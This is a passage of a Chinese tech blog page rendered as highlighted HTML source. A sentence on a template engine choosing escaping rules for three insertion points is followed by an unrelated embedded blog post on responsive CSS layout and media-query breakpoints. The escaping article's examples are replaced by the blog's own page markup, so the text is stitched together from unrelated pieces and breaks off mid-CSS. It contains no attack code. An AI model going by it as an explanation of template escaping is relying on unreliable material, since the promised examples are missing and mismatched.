                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#服务器"</span> <span class="na">title=</span><span class="s">"服务器"</span> <span class="na">rel=</span><span class="s">"22"</span><span class="nt">&gt;</span>
                                    服务器
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#算法"</span> <span class="na">title=</span><span class="s">"算法"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    算法
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Scikit-Learn"</span> <span class="na">title=</span><span class="s">"Scikit-Learn"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    Scikit-Learn
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#术语"</span> <span class="na">title=</span><span class="s">"术语"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    术语
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#领域适应"</span> <span class="na">title=</span><span class="s">"领域适应"</span> <span class="na">rel=</span><span class="s">"12"</span><span class="nt">&gt;</span>
                                    领域适应
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#低资源机器翻译"</span> <span class="na">title=</span><span class="s">"低资源机器翻译"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    低资源机器翻译
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#预训练模型"</span> <span class="na">title=</span><span class="s">"预训练模型"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    预训练模型
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Shell"</span> <span class="na">title=</span><span class="s">"Shell"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    Shell
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#论文投稿"</span> <span class="na">title=</span><span class="s">"论文投稿"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    论文投稿
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#语料库"</span> <span class="na">title=</span><span class="s">"语料库"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    语料库
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#bugs"</span> <span class="na">title=</span><span class="s">"bugs"</span> <span class="na">rel=</span><span class="s">"18"</span><span class="nt">&gt;</span>
                                    bugs
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#饮食"</span> <span class="na">title=</span><span class="s">"饮食"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    饮食
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#数据增强"</span> <span class="na">title=</span><span class="s">"数据增强"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    数据增强
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#LeetCode"</span> <span class="na">title=</span><span class="s">"LeetCode"</span> <span class="na">rel=</span><span class="s">"67"</span><span class="nt">&gt;</span>
                                    LeetCode
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#命名实体识别"</span> <span class="na">title=</span><span class="s">"命名实体识别"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    命名实体识别
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#tensorflow"</span> <span class="na">title=</span><span class="s">"tensorflow"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    tensorflow
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#数据库"</span> <span class="na">title=</span><span class="s">"数据库"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    数据库
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#咨询"</span> <span class="na">title=</span><span class="s">"咨询"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    咨询
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Offer"</span> <span class="na">title=</span><span class="s">"Offer"</span> <span class="na">rel=</span><span class="s">"42"</span><span class="nt">&gt;</span>
                                    Offer
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#LaTeX"</span> <span class="na">title=</span><span class="s">"LaTeX"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    LaTeX
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#前端"</span> <span class="na">title=</span><span class="s">"前端"</span> <span class="na">rel=</span><span class="s">"7"</span><span class="nt">&gt;</span>
                                    前端
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#面试"</span> <span class="na">title=</span><span class="s">"面试"</span> <span class="na">rel=</span><span class="s">"7"</span><span class="nt">&gt;</span>
                                    面试
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
        			<span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/section&gt;</span>
                

                <span class="c">&lt;!-- Friends Blog --&gt;</span>
                
                <span class="nt">&lt;hr&gt;</span>
                <span class="nt">&lt;h5&gt;</span>FRIENDS<span class="nt">&lt;/h5&gt;</span>
                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"list-inline"</span><span class="nt">&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://i.csdn.net/#/uc/profile"</span><span class="nt">&gt;</span>CSDN·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://www.meipai.com/user/1088601139?client_id=1089857299&amp;gid=1119354961&amp;uid=1088601139&amp;utm_user_id=1088601139&amp;utm_content=test&amp;utm_source=meipai_share&amp;utm_term=meipai_ios"</span><span class="nt">&gt;</span>美拍·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://show.gotokeep.com/users/573d84f646054cc85d430037?utm_source=wechat&amp;utm_medium=web&amp;utm_campaign=client_share&amp;utm_term=&amp;utm_content=users"</span><span class="nt">&gt;</span>Keep·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://www.douban.com/people/102650670/"</span><span class="nt">&gt;</span>豆瓣·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                <span class="nt">&lt;/ul&gt;</span>
                
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/article&gt;</span>






<span class="c">&lt;!-- async load function --&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="kd">function</span> <span class="k">async</span><span class="p">(</span><span class="nx">u</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nb">document</span><span class="p">,</span> <span class="nx">t</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">,</span>
          <span class="nx">o</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">t</span><span class="p">),</span>
          <span class="nx">s</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="nx">t</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
      <span class="nx">o</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">u</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span> <span class="nx">o</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="nx">c</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span> <span class="p">},</span> <span class="kc">false</span><span class="p">);</span> <span class="p">}</span>
      <span class="nx">s</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">s</span><span class="p">);</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="c">&lt;!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ --&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="k">async</span><span class="p">(</span><span class="dl">"</span><span class="s2">//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js</span><span class="dl">"</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span>
        <span class="c1">// BY Fix:去除标题前的‘#’ issues:</span><span class="o">&lt;</span><span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/qiubaiying/qiubaiying.github.io/issues/137&gt;</span>
        <span class="c1">// anchors.options = {</span>
        <span class="c1">//   visible: 'always',</span>
        <span class="c1">//   placement: 'right',</span>
        <span class="c1">//   icon: '#'</span>
        <span class="c1">// };</span>
        <span class="nx">anchors</span><span class="p">.</span><span class="nx">add</span><span class="p">().</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.intro-header h1</span><span class="dl">'</span><span class="p">).</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.subheading</span><span class="dl">'</span><span class="p">).</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.sidebar-container h5</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">})</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;style&gt;</span>
    <span class="c">/* place left on bigger screen */</span>
    <span class="k">@media</span> <span class="n">all</span> <span class="n">and</span> <span class="p">(</span><span class="n">min-width</span><span class="p">:</span> <span class="m">800px</span><span class="p">)</span> <span class="p">{</span>
        <span class="nc">.anchorjs-link</span><span class="p">{</span>
            <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
            <span class="nl">left</span><span class="p">:</span> <span class="m">-0.75em</span><span class="p">;</span>
            <span class="nl">font-size</span><span class="p">:</span> <span class="m">1.1em</span><span class="p">;</span>
            <span class="nl">margin-top</span> <span class="p">:</span> <span class="m">-0.1em</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/a&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">""</span><span class="nt">&gt;</span><span class="c">&lt;!-- Image to hack wechat --&gt;</span>
<span class="c">&lt;!-- &lt;img src="/img/icon_wechat.png" width="0" height="0"&gt; --&gt;</span>
<span class="c">&lt;!-- &lt;img src="/https://cdn.jsdelivr.net/gh/tian-guo-guo/cdn@1.0/assets/img/home-bg-art.jpg" width="0" height="0"&gt; --&gt;</span>

<span class="c">&lt;!-- Post Header --&gt;</span>
<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
    <span class="nt">header</span><span class="nc">.intro-header</span><span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span> <span class="nb">relative</span><span class="p">;</span>
        <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url('https://cdn.jsdelivr.net/gh/tian-guo-guo/cdn@1.0/assets/img/home-bg-art.jpg')</span>
    <span class="p">}</span>

    
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"intro-header"</span> <span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"header-mask"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"post-heading"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tags"</span><span class="nt">&gt;</span>
                        
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"tag"</span> <span class="na">href=</span><span class="s">"/tags/#前端"</span> <span class="na">title=</span><span class="s">"前端"</span><span class="nt">&gt;</span>前端<span class="nt">&lt;/a&gt;</span>
                        
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"tag"</span> <span class="na">href=</span><span class="s">"/tags/#面试"</span> <span class="na">title=</span><span class="s">"面试"</span><span class="nt">&gt;</span>面试<span class="nt">&lt;/a&gt;</span>
                        
                    <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;h1&gt;</span>前端响应式布局原理与方案（详细版）<span class="nt">&lt;/h1&gt;</span>
                    
                    
                    <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"subheading"</span><span class="nt">&gt;</span>前端响应式布局原理与方案（详细版）<span class="nt">&lt;/h2&gt;</span>
                    
                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"meta"</span><span class="nt">&gt;</span>Posted by 甜果果 on October 11, 2020<span class="nt">&lt;/span&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/header&gt;</span>

<span class="c">&lt;!-- Post Content --&gt;</span>
<span class="nt">&lt;article&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>

    <span class="c">&lt;!-- Post Container --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container"</span><span class="nt">&gt;</span>

				<span class="nt">&lt;h1</span> <span class="na">id=</span><span class="s">"前端响应式布局原理与方案详细版"</span><span class="nt">&gt;</span>前端响应式布局原理与方案（详细版）<span class="nt">&lt;/h1&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"引言"</span><span class="nt">&gt;</span>引言<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>响应式布局指的是同一页面在不同屏幕尺寸下有不同的布局。传统的开发方式是PC端开发一套，手机端再开发一套，而使用响应式布局只要开发一套就够，缺点就是<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS<span class="nt">&lt;/code&gt;</span>比较重。下面是博客网站对不同设备适配后的结果，分别是<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>iPhone5/SE<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>iphone6/7/8<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>iphone 6/7/8 plus<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>ipad pro<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>dell台式宽屏(1440 X 900)<span class="nt">&lt;/code&gt;</span>。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;blockquote&gt;</span>
  <span class="nt">&lt;p&gt;</span>响应式设计与自适应设计的区别：响应式开发一套界面，通过检测视口分辨率，针对不同客户端在客户端做代码处理，来展现不同的布局和内容；自适应需要开发多套界面，通过检测视口分辨率，来判断当前访问的设备是pc端、平板、手机，从而请求服务层，返回不同的页面。<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/blockquote&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa90c7235d85f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa90e7c6d1332?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa91116cdded6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"响应式布局的实现方案"</span><span class="nt">&gt;</span>响应式布局的实现方案<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"1-媒体查询"</span><span class="nt">&gt;</span>1. 媒体查询<span class="nt">&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS3<span class="nt">&lt;/code&gt;</span>媒体查询可以让我们针对不同的媒体类型定义不同的样式，当重置浏览器窗口大小的过程中，页面也会根据浏览器的宽度和高度重新渲染页面。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h4</span> <span class="na">id=</span><span class="s">"如何选择屏幕大小分割点"</span><span class="nt">&gt;</span>如何选择屏幕大小分割点<span class="nt">&lt;/h4&gt;</span>

<span class="nt">&lt;p&gt;</span>如何确定媒体查询的分割点也是一个开发中会遇到的问题，下面是市场上的移动设备和电脑屏幕分辨率的分布情况，可以发现不同品牌和型号的设备屏幕分辨率一般都不一样<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa8fe7ac87fa5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>如果我们选择<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>600px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>900px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>1200px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>1800px<span class="nt">&lt;/code&gt;</span>作为分割点，可以适配到常见的14个机型：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa907bb99b4ea?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>当然这只是其中的一种分割方案，我们还可以这样划分：<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>480px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>800px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>1400px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>1400px<span class="nt">&lt;/code&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2017/11/24/15fec33003371f62?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>而作为曾经典型的响应式布局框架，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>Bootstrap<span class="nt">&lt;/code&gt;</span>是怎么进行断点的呢？<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa8fc4e71232e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>上面的分割方案不一定满足项目中的实际需求，我们可以先用跨度大的分割点进行分割，如果出现不适配的情况可以再根据实际情况增加新的分割点。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h4</span> <span class="na">id=</span><span class="s">"移动优先-or--pc优先"</span><span class="nt">&gt;</span>移动优先 OR  PC优先<span class="nt">&lt;/h4&gt;</span>

<span class="nt">&lt;p&gt;</span>不管是移动优先还是PC优先，都是依据当随着屏幕宽度增大或减小的时候，后面的样式会覆盖前面的样式。因此，移动端优先首先使用的是<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>min-width<span class="nt">&lt;/code&gt;</span>，PC端优先使用的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>max-width<span class="nt">&lt;/code&gt;</span>。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>移动优先:<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/* iphone6 7 8 */
body {
    background-color: yellow;
}
/* iphone 5 */
@media screen and (max-width: 320px) {
    body {
      background-color: red;
    }
}
/* iphoneX */
@media screen and (min-width: 375px) and (-webkit-device-pixel-ratio: 3) {
    body {
      background-color: #0FF000;
    }
}
/* iphone6 7 8 plus */
@media screen and (min-width: 414px) {
    body {
      background-color: blue;
    }
}
/* ipad */
@media screen and (min-width: 768px) {
    body {
      background-color: green;
    }
}
/* ipad pro */
@media screen and (min-width: 1024px) {
    body {
      background-color: #FF00FF;
    }
}
/* pc */
@media screen and (min-width: 1100px) {
    body {
      background-color: black;
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>PC优先：<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/* pc width <span class="ni">&amp;gt;</span> 1024px */
    body {
        background-color: yellow;
    }
/* ipad pro */
@media screen and (max-width: 1024px) {
    body {
        background-color: #FF00FF;
    }
}
/* ipad */
@media screen and (max-width: 768px) {
    body {
        background-color: green;
    }
}
/* iphone6 7 8 plus */
@media screen and (max-width: 414px) {
    body {
        background-color: blue;
    }
}
/* iphoneX */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 3) {
    body {
        background-color: #0FF000;
    }
}
/* iphone6 7 8 */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 2) {
    body {
        background-color: #0FF000;
    }
}
/* iphone5 */
@media screen and (max-width: 320px) {
    body {
        background-color: #0FF000;
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"2百分比布局"</span><span class="nt">&gt;</span>2.百分比布局<span class="nt">&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>通过百分比单位，可以使得浏览器中组件的宽和高随着浏览器的高度的变化而变化，从而实现响应式的效果。Bootstrap里面的栅格系统就是利用百分比来定义元素的宽高，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS3<span class="nt">&lt;/code&gt;</span>支持最大最小高，可以将百分比和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>max(min)<span class="nt">&lt;/code&gt;</span>一起结合使用来定义元素在不同设备下的宽高。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/* pc width <span class="ni">&amp;gt;</span> 1100px */
html, body { margin: 0;padding: 0;width: 100%;height: 100%;}
aside {
    width: 10%;
    height: 100%;
    background-color: red;
    float: left;
}
main {
    height: 100%;
    background-color: blue;
    overflow: hidden;
}
/* ipad pro */
@media screen and (max-width: 1024px) {
    aside {
      width: 8%;
      background-color: yellow;
    }
}
/* ipad */
@media screen and (max-width: 768px) {
    aside {
      float: none;
      width: 100%;
      height: 10%;
      background-color: green;
    }
    main {
      height: calc(100vh - 10%);
      background-color: red;
    }
}
/* iphone6 7 8 plus */
@media screen and (max-width: 414px) {
    aside {
      float: none;
      width: 100%;
      height: 5%;
      background-color: yellow;
    }
    main {
      height: calc(100vh - 5%);
      background-color: red;
    }
}
/* iphoneX */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 3) {
    aside {
      float: none;
      width: 100%;
      height: 10%;
      background-color: blue;
    }
    main {
      height: calc(100vh - 10%);
      background-color: red;
    }
}
/* iphone6 7 8 */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 2) {
    aside {
      float: none;
      width: 100%;
      height: 3%;
      background-color: black;
    }
    main {
